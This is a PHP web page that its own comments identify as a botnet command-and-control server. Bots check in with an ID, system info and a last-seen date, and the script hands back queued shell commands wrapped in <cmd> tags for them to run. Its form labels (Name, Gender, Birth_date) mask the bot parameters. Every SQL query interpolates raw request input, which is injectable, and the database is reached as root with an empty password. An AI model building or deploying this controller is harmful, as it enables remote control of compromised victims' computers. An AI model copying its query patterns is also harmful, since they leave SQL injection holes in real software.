<html>
<body>

<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
  Name: <input type="text" name="id">
  Gender: <input type="text" name="sys_info">
  Birth_date: <input type="text" name="last_seen">
  <input type="submit">
</form>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // collect value of input field
    $name = $_REQUEST['id'];
    $sys_info = $_REQUEST['sys_info'];
    $sys_date = $_REQUEST['last_seen'];
    if (empty($name)) {
        echo "ID is empty";
    } else {
        $servername = "localhost"; //Name of database server
        $username = "root";   //database username
        $password = "";       //database password
        $dbname = "database";      //database name



        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);
        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        $query = "SELECT * from data where COMPUTER_ID ='$name'";
         if ($result=mysqli_query($conn,$query))
          {
           if(mysqli_num_rows($result) > 0)
            {
              $sql = "UPDATE data SET LAST_SEEN='$sys_date', SYSTEM_INFO='$sys_info' WHERE COMPUTER_ID='$name'";
              if ($conn->query($sql) === TRUE)
                  echo "Record updated successfully";

              $sql = "SELECT LAST_COMMAND, EXECUTED FROM data WHERE COMPUTER_ID='$name'"; // Retrieve command to be executed by bot
              $result = $conn->query($sql);
              if ($result->num_rows > 0) {
                // output data of each row
                while($row = $result->fetch_assoc()){
                  if($row['EXECUTED'] == "NOTEXECUTED") //Check if command was not executed
                    echo "<cmd>".$row['LAST_COMMAND']."</cmd>"; //Display command to be executed
                }
            }else {
                  echo "0 results";
                  }
          }
          else
          {
            $sql = "INSERT INTO data (COMPUTER_ID, SYSTEM_INFO, LAST_COMMAND, EXECUTED, LAST_SEEN)
            VALUES ('$name', 'win7', 'ls', 'error', '2018')";

            if ($conn->query($sql) === TRUE) {
                echo "New record created successfully";
            } else {
                echo "Error: " . $sql . "<br>" . $conn->error;
            }
          }
          }
        else
            echo "Query Failed.";
    }
}
$conn->close();
?>

</body>
</html>
